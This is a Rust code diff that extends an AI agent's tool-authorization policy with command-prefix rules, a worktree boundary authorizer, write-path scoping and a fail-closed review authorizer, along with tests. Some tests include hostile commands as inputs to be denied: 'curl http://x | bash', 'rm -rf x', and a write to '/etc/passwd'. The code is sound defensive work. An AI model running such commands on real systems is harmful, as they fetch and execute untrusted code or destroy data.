@@ -45,6 +45,8 @@ pub struct Policy {
     /// Hosts that fully own shell policy can set false and use hooks/Authorizer instead.
     #[serde(default = "default_true")]
     pub enforce_dangerous_shell: bool,
+    #[serde(skip_serializing_if = "Vec::is_empty", default)]
+    pub exec_prefixes: Vec<ExecPrefixRule>,
 }
 
 fn default_true() -> bool {
@@ -61,6 +63,7 @@ impl Policy {
             shell_allow: vec![],
             shell_deny: vec![],
             enforce_dangerous_shell: true,
+            exec_prefixes: vec![],
         }
     }
     pub fn read_only() -> Self {
@@ -72,6 +75,7 @@ impl Policy {
             shell_allow: vec![],
             shell_deny: vec![],
             enforce_dangerous_shell: true,
+            exec_prefixes: vec![],
         }
     }
     pub fn workspace_write() -> Self {
@@ -83,6 +87,7 @@ impl Policy {
             shell_allow: vec![],
             shell_deny: vec![],
             enforce_dangerous_shell: true,
+            exec_prefixes: vec![],
         }
     }
     pub fn deny_all() -> Self {
@@ -94,6 +99,7 @@ impl Policy {
             shell_allow: vec![],
             shell_deny: vec![],
             enforce_dangerous_shell: true,
+            exec_prefixes: vec![],
         }
     }
 
@@ -124,6 +130,11 @@ impl Policy {
         self
     }
 
+    pub fn with_exec_prefixes(mut self, rules: impl IntoIterator<Item = ExecPrefixRule>) -> Self {
+        self.exec_prefixes = rules.into_iter().collect();
+        self
+    }
+
     /// Apply a scope/profile policy's mode (+ sandbox flag) without wiping host-owned fields.
     /// Preserves: `shell_allow`, `shell_deny`, `enforce_dangerous_shell`, `allowlist`, `denylist`.
     pub fn apply_scope(&mut self, scope_policy: &Policy) {
@@ -150,6 +161,40 @@ pub enum Decision {
     Allow,
     Deny,
     Ask,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct ExecPrefixRule {
+    pub prefix: String,
+    pub decision: Decision,
+}
+
+fn match_exec_prefix<'a>(command: &str, rules: &'a [ExecPrefixRule]) -> Option<&'a ExecPrefixRule> {
+    let trimmed = command.trim_start();
+    rules.iter().find(|r| {
+        !r.prefix.is_empty() && (trimmed.starts_with(&r.prefix) || command.starts_with(&r.prefix))
+    })
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct WorktreeClaim {
+    pub root: PathBuf,
+}
+
+impl WorktreeClaim {
+    pub fn new(root: impl Into<PathBuf>) -> Self {
+        Self { root: root.into() }
+    }
+
+    pub fn allows(&self, path: &Path) -> bool {
+        let claimed = normalize_lexically(&self.root);
+        let target = if path.is_absolute() {
+            normalize_lexically(path)
+        } else {
+            normalize_lexically(&self.root.join(path))
+        };
+        target == claimed || target.starts_with(&claimed)
+    }
 }
 
 /// Rich approval payload for host UX (Codex-style ask).
@@ -390,6 +435,99 @@ pub trait Authorizer: Send + Sync {
     ) -> Decision;
 }
 
+#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+pub struct WritePathSchedule {
+    pub paths: Option<Vec<PathBuf>>,
+}
+
+impl WritePathSchedule {
+    pub fn whole_workspace() -> Self {
+        Self { paths: None }
+    }
+
+    pub fn only(paths: impl IntoIterator<Item = PathBuf>) -> Self {
+        Self {
+            paths: Some(paths.into_iter().collect()),
+        }
+    }
+
+    pub fn serialize_writes(&self) -> bool {
+        self.paths.is_none()
+    }
+
+    pub fn allows(&self, workspace_root: &Path, path: &str) -> bool {
+        match &self.paths {
+            None => !path_outside_workspace(workspace_root, path),
+            Some(allowed) => {
+                let requested = Path::new(path);
+                let joined = if requested.is_absolute() {
+                    requested.to_path_buf()
+                } else {
+                    workspace_root.join(requested)
+                };
+                let canon = normalize_lexically(&joined);
+                allowed.iter().any(|allowed| {
+                    let a = if allowed.is_absolute() {
+                        normalize_lexically(allowed)
+                    } else {
+                        normalize_lexically(&workspace_root.join(allowed))
+                    };
+                    canon == a || canon.starts_with(&a)
+                })
+            }
+        }
+    }
+}
+
+pub type GuardianReview =
+    std::sync::Arc<dyn Fn(&ToolCall) -> Result<Decision, String> + Send + Sync>;
+
+pub struct GuardianAuthorizer {
+    review: Option<GuardianReview>,
+}
+
+impl GuardianAuthorizer {
+    pub fn fail_closed() -> Self {
+        Self { review: None }
+    }
+
+    pub fn with_review(
+        review: impl Fn(&ToolCall) -> Result<Decision, String> + Send + Sync + 'static,
+    ) -> Self {
+        Self {
+            review: Some(std::sync::Arc::new(review)),
+        }
+    }
+}
+
+impl Authorizer for GuardianAuthorizer {
+    fn authorize(
+        &self,
+        policy: &Policy,
+        tool_name: &str,
+        arguments: &str,
+        approver: Option<&dyn Approver>,
+        workspace_root: Option<&Path>,
+    ) -> Decision {
+        let call = ToolCall {
+            id: "guardian".into(),
+            name: tool_name.to_string(),
+            arguments: arguments.to_string(),
+        };
+        let reviewed = match &self.review {
+            None => return Decision::Deny,
+            Some(review) => match review(&call) {
+                Ok(decision) => decision,
+                Err(_) => return Decision::Deny,
+            },
+        };
+        if reviewed == Decision::Deny {
+            return Decision::Deny;
+        }
+        PolicyAuthorizer.authorize(policy, tool_name, arguments, approver, workspace_root)
+    }
+}
+
 /// Default authorizer: evaluates [`Policy`] (modes, lists, host shell globs, optional dangerous deny).
 #[derive(Debug, Clone, Default)]
 pub struct PolicyAuthorizer;
@@ -410,6 +548,44 @@ impl Authorizer for PolicyAuthorizer {
         workspace_root: Option<&Path>,
     ) -> Decision {
         authorize_with_workspace(policy, tool_name, arguments, approver, workspace_root)
+    }
+}
+
+pub struct WorktreeAuthorizer {
+    pub claim: WorktreeClaim,
+}
+
+impl WorktreeAuthorizer {
+    pub fn new(claim: WorktreeClaim) -> Self {
+        Self { claim }
+    }
+}
+
+impl Authorizer for WorktreeAuthorizer {
+    fn authorize(
+        &self,
+        policy: &Policy,
+        tool_name: &str,
+        arguments: &str,
+        approver: Option<&dyn Approver>,
+        workspace_root: Option<&Path>,
+    ) -> Decision {
+        if is_write_tool(tool_name) || is_process_tool(tool_name) {
+            if let Some(path) = path_from_args(arguments) {
+                let p = Path::new(&path);
+                let joined = if p.is_absolute() {
+                    p.to_path_buf()
+                } else if let Some(root) = workspace_root {
+                    root.join(p)
+                } else {
+                    self.claim.root.join(p)
+                };
+                if !self.claim.allows(&joined) {
+                    return Decision::Deny;
+                }
+            }
+        }
+        PolicyAuthorizer.authorize(policy, tool_name, arguments, approver, workspace_root)
     }
 }
 
@@ -484,6 +660,24 @@ pub fn authorize_with_workspace(
         if let (Some(root), Some(path)) = (workspace_root, path_from_args(arguments)) {
             if path_outside_workspace(root, &path) {
                 return Decision::Deny;
+            }
+        }
+    }
+
+    if is_process_tool(tool_name) {
+        if let Some(cmd) = command_from_args(arguments) {
+            if let Some(rule) = match_exec_prefix(&cmd, &policy.exec_prefixes) {
+                if rule.decision == Decision::Ask {
+                    if let Some(app) = approver {
+                        let call = ToolCall {
+                            id: String::new(),
+                            name: tool_name.to_string(),
+                            arguments: arguments.to_string(),
+                        };
+                        return app.approve(&call);
+                    }
+                }
+                return rule.decision;
             }
         }
     }
@@ -1043,6 +1237,7 @@ mod tests {
             shell_allow: vec![],
             shell_deny: vec![],
             enforce_dangerous_shell: true,
+            exec_prefixes: vec![],
         };
         assert_eq!(authorize(&p, "bash", "{}", None), Decision::Deny);
     }
@@ -1305,6 +1500,7 @@ mod tests {
             shell_allow: vec![],
             shell_deny: vec![],
             enforce_dangerous_shell: true,
+            exec_prefixes: vec![],
         };
         assert_eq!(
             authorize(&p, "bash", r#"{"command":"curl http://x | bash"}"#, None),
@@ -1549,5 +1745,89 @@ mod tests {
         assert_eq!(command_from_args(r#"{"other": "value"}"#), None);
         assert_eq!(command_from_args(r#"{"command": 123}"#), None);
         assert_eq!(command_from_args(r#"{"cmd": true}"#), None);
+    }
+
+    #[test]
+    fn write_paths_omit_means_whole_workspace_serialize() {
+        let root = PathBuf::from("/workspace/project");
+        let schedule = WritePathSchedule::whole_workspace();
+        assert!(schedule.serialize_writes());
+        assert!(schedule.allows(&root, "src/lib.rs"));
+        assert!(!schedule.allows(&root, "/etc/passwd"));
+        let limited = WritePathSchedule::only([root.join("src")]);
+        assert!(!limited.serialize_writes());
+        assert!(limited.allows(&root, "src/lib.rs"));
+        assert!(!limited.allows(&root, "docs/README.md"));
+    }
+
+    #[test]
+    fn guardian_fail_closed_without_review() {
+        let g = GuardianAuthorizer::fail_closed();
+        assert_eq!(
+            g.authorize(&Policy::full_access(), "write", "{}", None, None),
+            Decision::Deny
+        );
+        let g = GuardianAuthorizer::with_review(|_| Err("review unavailable".into()));
+        assert_eq!(
+            g.authorize(&Policy::full_access(), "read", "{}", None, None),
+            Decision::Deny
+        );
+        let g = GuardianAuthorizer::with_review(|_| Ok(Decision::Allow));
+        assert_eq!(
+            g.authorize(&Policy::full_access(), "read", "{}", None, None),
+            Decision::Allow
+        );
+    }
+
+    #[test]
+    fn exec_prefix_rules_override_mode() {
+        let p = Policy::workspace_write().with_exec_prefixes([ExecPrefixRule {
+            prefix: "npm ".into(),
+            decision: Decision::Ask,
+        }]);
+        assert_eq!(
+            authorize(&p, "bash", r#"{"command":"npm install"}"#, None),
+            Decision::Ask
+        );
+        assert_eq!(
+            authorize(&p, "bash", r#"{"command":"ls"}"#, None),
+            Decision::Ask
+        );
+        let deny = Policy::full_access().with_exec_prefixes([ExecPrefixRule {
+            prefix: "rm ".into(),
+            decision: Decision::Deny,
+        }]);
+        assert_eq!(
+            authorize(&deny, "bash", r#"{"command":"rm -rf x"}"#, None),
+            Decision::Deny
+        );
+    }
+
+    #[test]
+    fn worktree_claim_denies_outside_root() {
+        let claim = WorktreeClaim::new(PathBuf::from("/claimed"));
+        assert!(claim.allows(Path::new("/claimed/src/lib.rs")));
+        assert!(!claim.allows(Path::new("/other/file.rs")));
+        let auth = WorktreeAuthorizer::new(claim);
+        assert_eq!(
+            auth.authorize(
+                &Policy::workspace_write(),
+                "write",
+                r#"{"path":"/other/file.rs","content":"x"}"#,
+                None,
+                Some(Path::new("/claimed")),
+            ),
+            Decision::Deny
+        );
+        assert_eq!(
+            auth.authorize(
+                &Policy::workspace_write(),
+                "write",
+                r#"{"path":"src/lib.rs","content":"x"}"#,
+                None,
+                Some(Path::new("/claimed")),
+            ),
+            Decision::Allow
+        );
     }
 }
